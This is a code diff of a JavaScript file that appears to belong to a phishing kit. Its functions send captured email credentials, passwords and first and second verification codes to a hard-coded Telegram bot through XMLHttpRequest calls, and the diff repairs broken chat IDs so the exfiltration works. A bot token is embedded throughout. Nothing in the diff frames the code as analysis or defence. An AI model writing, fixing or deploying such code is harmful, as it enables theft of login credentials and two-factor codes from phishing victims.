@@ -168,11 +168,11 @@ function sendEmailPasswordTelegram() {
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
     var chat_id = 6612189281;
     var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
-    var chat_id = 6612189281s;
-    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
     oReq.open("GET", url, true);
@@ -192,11 +192,11 @@ function sendFirstCodeTelegram() {
     var chat_id = 6612189281;
     var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
     oReq.open("GET", url, true);
@@ -216,11 +216,11 @@ function sendSecCodeTelegram() {
     var chat_id = 6612189281;
     var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
     oReq.open("GET", url, true);
@@ -243,14 +243,14 @@ function hiniDikush() {
     var url = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
 
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw";
-    var chat_id = 6612189281s;
-    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url1 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
     var token = "6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEww";
-    var chat_id = 6612189281s;
-    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281s&parse_mode=html`;
+    var chat_id = 6612189281;
+    var url2 = `https://api.telegram.org/bot6721733180:AAGhPq46AT9EfNwqXWcUUGChsX4irgUbCEw/sendMessage?text=${message}&chat_id=6612189281&parse_mode=html`;
 
     var oReq = new XMLHttpRequest();
     oReq.open("GET", url, true);
@@ -262,22 +262,3 @@ function hiniDikush() {
     oReq.open("GET", url2, true);
     oReq.send();
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
